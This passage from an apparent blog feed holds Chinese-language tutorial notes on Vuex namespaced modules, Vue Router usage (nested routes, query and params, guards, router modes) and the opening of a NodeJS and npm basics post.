 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">countAbout</span>.<span class="property">xxx</span></span><br><span class="line"><span class="comment">// 方式二：借助mapState讀取</span></span><br><span class="line">...<span class="title function_">mapState</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中讀取<code>getters</code>數據：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>[<span class="string">&#x27;countAbout/xxx&#x27;</span>]</span><br><span class="line"><span class="comment">// 方式二：借助mapGetters讀取</span></span><br><span class="line">...<span class="title function_">mapGetters</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中調用<code>dispatch</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;countAbout/xxx&#x27;</span>, value)</span><br><span class="line"><span class="comment">// 方式二：借助mapActions讀取</span></span><br><span class="line">...<span class="title function_">mapActions</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;xxx&#x27;</span>])</span><br></pre></td></tr></table></figure>

</li>
<li><p>開啟命名空間後，組件中調用<code>commit</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：直接讀取</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;countAbout/XXX&#x27;</span>, value)</span><br><span class="line"><span class="comment">// 方式二：借助mapMutations讀取</span></span><br><span class="line">...<span class="title function_">mapMutations</span>(<span class="string">&#x27;countAbout&#x27;</span>, [<span class="string">&#x27;XXX&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>VueJS</category>
      </categories>
      <tags>
        <tag>VueJS</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS - Vue Router</title>
    <url>/myBlog/2022/06/26/2022/2022-6-26-VueJS-Router/</url>
    <content><![CDATA[<h1 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue Router"></a>Vue Router</h1><h2 id="Vue-router理解"><a href="#Vue-router理解" class="headerlink" title="Vue-router理解"></a>Vue-router理解</h2><ol>
<li><p>理解：<br> vue的一個插件庫，專門用來實現SPA應用</p>
</li>
<li><p>對SPA應用的理解：</p>
<ol>
<li>單頁Web應用 (single page web application)</li>
<li>整個應用只有一個完整的頁面</li>
<li>點擊頁面中的導航鏈接不會刷新頁面，只會做頁面的<font color="#f54747">局部更新</font></li>
<li>數據需要用過ajax請求獲取</li>
</ol>
</li>
</ol>
<h2 id="route路由的理解"><a href="#route路由的理解" class="headerlink" title="route路由的理解"></a>route路由的理解</h2><ol>
<li><p>理解：</p>
<ol>
<li>一個就是一組映射關係 (key - value)</li>
<li><code>key</code>為路徑，<code>value</code>可能是<code>function</code>或<code>component</code></li>
</ol>
</li>
<li><p>路由的分類：</p>
<ol>
<li>後端路由：<ul>
<li>理解：<code>value</code>是<code>function</code>，統御處理客戶端提交的請求</li>
<li>工作過程：服務器接收到一個請求時，根據請求路徑找到匹配的函數來處理請求，返回響應函數</li>
</ul>
</li>
<li>前端路由：<ul>
<li>理解：<code>value</code>是<code>component</code>，用於展示頁面內容</li>
<li>工作過程：當瀏覽器的路徑改變時，對應的組件就會顯示</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="Vue-router的基本使用"><a href="#Vue-router的基本使用" class="headerlink" title="Vue-router的基本使用"></a>Vue-router的基本使用</h2><ol>
<li><p>安裝</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i vue-router</span><br></pre></td></tr></table></figure>

</li>
<li><p>在<code>main.js</code>中應用插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// 應用</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>編寫<code>router</code>配置項：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入VueRouter</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// 引入組件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&#x27;../components/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;../components/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建並暴露router實例對象，去管理路由規則</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">    <span class="attr">routes</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Home</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>實現切換：借助<code>&lt;router-link&gt;</code>標籤實現路由的切換</p>
<ul>
<li><code>active-class</code>可配置高亮樣式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/about&quot;&gt;About&lt;/router-link&gt;</span><br><span class="line">&lt;router-link active-class=&quot;active&quot; to=&quot;/home&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>指定展示位置：借助<code>&lt;router-view&gt;</code>指定組件的呈現位置</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>注意：</p>
<ol>
<li>路由組件通常存放在<code>pages</code>文件夾，一般組件通常存放在<code>components</code>文件夾</li>
<li>通過切換，「隱藏」了的路由組件，默認是被<font color="#f54747">銷毀掉</font>的，需要的時候再去掛載</li>
<li>每個組件都有自己的<code>$route</code>屬性，裏面存放著自己的路由信息</li>
<li>整個應用只有一個router，可以通過組件的<code>$router</code>屬性獲取</li>
</ol>
</li>
</ol>
<h2 id="嵌套路由（多級路由）"><a href="#嵌套路由（多級路由）" class="headerlink" title="嵌套路由（多級路由）"></a>嵌套路由（多級路由）</h2><ol>
<li><p>配置路由規則時，使用<code>children</code>配置項：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">routes</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">About</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">        <span class="attr">children</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>:<span class="string">&#x27;news&#x27;</span>,        <span class="comment">// 此處一定不要寫&#x27;/news&#x27;</span></span><br><span class="line">                <span class="attr">component</span>:<span class="title class_">News</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>:<span class="string">&#x27;message&#x27;</span>,     <span class="comment">// 此處一定不要寫&#x27;/message&#x27;</span></span><br><span class="line">                <span class="attr">component</span>:<span class="title class_">Message</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>跳轉（要寫完整路徑）：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的query參數"><a href="#路由的query參數" class="headerlink" title="路由的query參數"></a>路由的query參數</h2><ol>
<li><p>傳遞參數</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳轉路由並攜帶query參數，to的字符串寫法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳轉路由並攜帶query參數，to的對象寫法 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        path:&#x27;home/message/detail&#x27;,</span><br><span class="line">        query:&#123;</span><br><span class="line">            id:m.id,</span><br><span class="line">            title:m.title</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>接收參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$route.<span class="property">query</span>.<span class="property">id</span></span><br><span class="line">$route.<span class="property">query</span>.<span class="property">title</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h2><ol>
<li><p>作用：可以簡化路由的跳轉（路由地址）</p>
</li>
<li><p>使用方法：</p>
<ol>
<li><p>給路由取名字</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/demo&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Demo</span>,</span><br><span class="line">    <span class="attr">children</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Test</span>,</span><br><span class="line">            <span class="attr">children</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;hello&#x27;</span>,       <span class="comment">// 給路由命名</span></span><br><span class="line">                    <span class="attr">path</span>:<span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line">                    <span class="attr">component</span>:<span class="title class_">Hello</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>簡化跳轉</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 簡化前寫法：完整路徑 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/demo/test/welcome&quot;&gt;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 簡化後寫法：直接通過名字跳轉 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;&gt;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 簡化後配合傳遞參數 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        name:&#x27;hello&#x27;,</span><br><span class="line">        query:&#123;</span><br><span class="line">            id:xxx,</span><br><span class="line">            title:yyy</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="路由的params參數"><a href="#路由的params參數" class="headerlink" title="路由的params參數"></a>路由的params參數</h2><ol>
<li><p>配置路由，聲明接收的params參數：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:<span class="title class_">Home</span>,</span><br><span class="line">    <span class="attr">children</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">path</span>:<span class="string">&#x27;message&#x27;</span>,</span><br><span class="line">            <span class="attr">component</span>:<span class="title class_">Message</span>,</span><br><span class="line">            <span class="attr">children</span>:[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;detailRouter&#x27;</span>,</span><br><span class="line">                    <span class="attr">path</span>:<span class="string">&#x27;detail/:id/:title&#x27;</span>,  <span class="comment">// 使用佔位聲明接收params參數</span></span><br><span class="line">                    <span class="attr">component</span>:<span class="title class_">Detail</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>傳遞參數：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 跳轉路由並攜帶params參數，to的字符串寫法 --&gt;</span><br><span class="line">&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳轉路由並攜帶params參數，to的對象寫法 --&gt;</span><br><span class="line">&lt;router-link</span><br><span class="line">    :to=&quot;&#123;</span><br><span class="line">        name:&#x27;detailRouter&#x27;,</span><br><span class="line">        params:&#123;</span><br><span class="line">            id:m.id,</span><br><span class="line">            title:m.title</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&quot;</span><br><span class="line">&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意點：路由攜帶params參數時，若使用to的對象寫法，則不能使用<code>path</code>配置項，必須使用<code>name</code>配置</li>
</ul>
</li>
<li><p>接收參數</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$route.params.id</span><br><span class="line">$route.params.title</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的props配置"><a href="#路由的props配置" class="headerlink" title="路由的props配置"></a>路由的props配置</h2><ol>
<li><p>作用：讓路由器組件更方便的接收到參數</p>
</li>
<li><p>使用方法：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一種寫法：對象。該對象中的所欲key-value都會以props的形式傳給Detail組件</span></span><br><span class="line"><span class="attr">props</span>:&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="string">&#x27;hello&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二種寫法：值為布爾值。若布爾值為真，則把該路由組件收到的所有params參數，以props的形式傳給Detail組件</span></span><br><span class="line"><span class="attr">props</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三種寫法：值為函數。該函數返回的對象中每一組key-value都會通過props傳給Detail組件</span></span><br><span class="line"><span class="title function_">props</span>(<span class="params">$route</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">id</span>:$route.<span class="property">query</span>.<span class="property">id</span>,</span><br><span class="line">        <span class="attr">title</span>:$route.<span class="property">query</span>.<span class="property">title</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="replace屬性"><a href="#replace屬性" class="headerlink" title="replace屬性"></a>replace屬性</h2><ol>
<li><p>作用：控制路由器跳轉時操作瀏覽器歷史紀錄的模式</p>
</li>
<li><p>瀏覽器的歷史紀錄有兩種寫入方式：分別是<code>push</code>和<code>replace</code></p>
<ul>
<li><code>push</code>是追加歷史紀錄</li>
<li><code>replace</code>是替換當前紀錄</li>
<li>路由跳轉時默認為<code>push</code></li>
</ul>
</li>
<li><p>開啟<code>replace</code>模式：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;router-link replace ...&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="編程式路由導航"><a href="#編程式路由導航" class="headerlink" title="編程式路由導航"></a>編程式路由導航</h2><ol>
<li><p>作用：不借助<code>&lt;router-link&gt;</code>實現路由跳轉，讓路由跳轉更加靈活</p>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以 push模式 跳轉到指定路由</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;routeName&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">        <span class="attr">id</span>:xxx,</span><br><span class="line">        <span class="attr">title</span>:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 replace模式 跳轉到指定路由</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;routeName&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">        <span class="attr">id</span>:xxx,</span><br><span class="line">        <span class="attr">title</span>:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">forward</span>()  <span class="comment">// 前進</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">back</span>()     <span class="comment">// 後退</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">go</span>(n)      <span class="comment">// 取決於 n 的數值前進或後退</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="緩存路由組件"><a href="#緩存路由組件" class="headerlink" title="緩存路由組件"></a>緩存路由組件</h2><ol>
<li><p>作用：讓不展示的路由組件保持掛載，不被銷毀</p>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 使用 include 指定需要保持掛載的組件 --&gt;</span><br><span class="line">&lt;keep-alive include=&quot;componentName&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line">&lt;!-- 使用 include 指定多個組件 --&gt;</span><br><span class="line">&lt;keep-alive :include=&quot;[&#x27;component1&#x27;,&#x27;component2&#x27;]&quot;&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由的兩個生命週期鉤子"><a href="#路由的兩個生命週期鉤子" class="headerlink" title="路由的兩個生命週期鉤子"></a>路由的兩個生命週期鉤子</h2><ol>
<li><p>作用：路由組件所獨有的兩個鉤子，用於捕獲路由組件的激活狀態</p>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由組件被激活時觸發</span></span><br><span class="line"><span class="title function_">activated</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由組件失去激活時觸發</span></span><br><span class="line"><span class="title function_">deactivated</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由守衛"><a href="#路由守衛" class="headerlink" title="路由守衛"></a>路由守衛</h2><ol>
<li><p>作用：對路由進行權限控制</p>
</li>
<li><p>全局路由守衛：用於監測所有路由切換</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局前置路由守衛 ———— 初始化的時候被調用、每次路由切換之前被調用</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;     <span class="comment">// 判斷是否需要鑒定權限</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()  <span class="comment">// 放行</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()  <span class="comment">// 放行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局後置路由守衛 ———— 初始化的時候被調用、每次路由切換之後被調用</span></span><br><span class="line">router.<span class="title function_">afterEach</span>(<span class="function">(<span class="params">to, <span class="keyword">from</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">meta</span>.<span class="property">title</span> || <span class="string">&#x27;Main Page&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>獨享路由守衛：用於監測指定的路由切換</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">beforeEnter</span>: <span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>備註：獨享路由守衛並沒有切換後的函數設置</li>
</ul>
</li>
<li><p>組件內路由守衛</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 進入路由守衛 ———— 通過路由規則，進入該組件時被調用</span></span><br><span class="line"><span class="title function_">beforeRouteEnter</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(to.<span class="property">meta</span>.<span class="property">isAuth</span>)&#123;     <span class="comment">// 判斷是否需要鑒定權限</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;CUHK&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;No auth to enter!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">// 離開路由守衛 ———— 通過路由規則，離開該組件時被調用</span></span><br><span class="line"><span class="title function_">beforeRouteLeave</span>(<span class="params">to, <span class="keyword">from</span>, next</span>)&#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="路由器的兩種工作模式"><a href="#路由器的兩種工作模式" class="headerlink" title="路由器的兩種工作模式"></a>路由器的兩種工作模式</h2><ol>
<li><p>對於url而言，hash值就是 ———— #及其後面的內容</p>
</li>
<li><p>hash值不會包含在HTTP請求中，即：hash值不會帶給服務器</p>
</li>
<li><p>hash模式：</p>
<ol>
<li>地址中永遠帶著 # 符號</li>
<li>若以後講地址通過第三方手機app分享，若app校驗嚴格，則地址會被標記為不合法</li>
<li>兼容性好</li>
</ol>
</li>
<li><p>history模式：</p>
<ol>
<li>地址美觀</li>
<li>兼容性和hash模式相比略差</li>
<li>應用部署上線時需要後端人員支持，解決刷新頁面服務器404問題</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>VueJS</category>
      </categories>
      <tags>
        <tag>VueJS</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Basic</title>
    <url>/myBlog/2022/06/28/2022/2022-6-28-NodeJS-Basic/</url>
    <content><![CDATA[<h2 id="NodeJS簡介"><a href="#NodeJS簡介" class="headerlink" title="NodeJS簡介"></a>NodeJS簡介</h2><ol>
<li><p>NodeJS簡介：</p>
<ul>
<li>NodeJS 是一個 JavaScript 運行環境，讓 JavaScript 可以開發後端程序，實現幾乎其他後端語言實現的所有功能，可以與 PHP、Java、Python 等後端語言平起平坐</li>
<li>NodeJS 是基於 V8 引擎，而 V8 是 Google 發布的開源 JavaScript 引擎</li>
</ul>
</li>
<li><p>NodeJS特性：</p>
<ul>
<li>NodeJS 語法完全是 JS 語法</li>
<li>NodeJS 超強的高並能力，實現高性能服務器</li>
<li>開發週期短、開發成本低、學習成本低</li>
</ul>
</li>
<li><p>NodeJS注意：</p>
<ul>
<li>瀏覽器是 JavaScript 的前端運行環境</li>
<li>Node.js 是 JavaScript 的後端運行環境</li>
<li>Node.js 中無法調用 DOM 和 BOM 等瀏覽器內置 API</li>
</ul>
</li>
<li><p>NodeJS學習路徑：<br> JavaScript 基礎語法 + Node.js 內置 API 模塊(<code>fs</code>, <code>path</code>, <code>http</code>) + 第三方 API 模塊(<code>express</code>, <code>mysql</code>)</p>
</li>
</ol>
<h2 id="Npm"><a href="#Npm" class="headerlink" title="Npm"></a>Npm</h2><ol>
<li><p>基本指令：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>npm init</code></td>
<td align="center">開始新項目，初始化紀錄文件</td>
</tr>
<tr>
<td align="center"><code>npm i</code></td>
<td align="center">安裝項目的全部依賴</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>npm install -g &quot;packageName&quot;</code></td>
<td align="center">安裝（<code>-g</code>表示全局操作）</td>
</tr>
<tr>
<td align="center"><code>npm uninstall -g &quot;packageName&quot;</code></td>
<td align="center">卸載</td>
</tr>
<tr>
<td align="center"><code>npm update -g &quot;packageName&quot;</code></td>
<td align="center">更新</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>npm list -g</code></td>
<td align="center">列舉安裝包（不加<code>-g</code>列舉當前目錄下的安裝包）</td>
</tr>
<tr>
<td align="center"><code>npm info &quot;packageName&quot;</code></td>
<td align="center">查看安裝包的詳細信息</td>
</tr>
<tr>
<td align="center"><code>npm install &quot;packageName&quot;@&quot;version&quot;</code></td>
<td align="center">安裝指定版本</td>
</tr>
<tr>
<td align="center"><code>npm outdated</code></td>
<td align="center">檢查安裝包是否過時</td>
</tr>
</tbody></table>
</li>
<li><p><code>package.json</code>文件紀錄：</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.1.0&quot;</span>     <span class="comment">// ^ 表示如果直接 npm install 將會安裝 md5 2.* 版本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;~2.1.0&quot;</span>     <span class="comment">// ~ 表示如果直接 npm install 將會安裝 md5 2.1.* 版本</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span>          <span class="comment">// * 表示如果直接 npm install 將會安裝 md5 最新版本</span></span><br><span class="line"><span 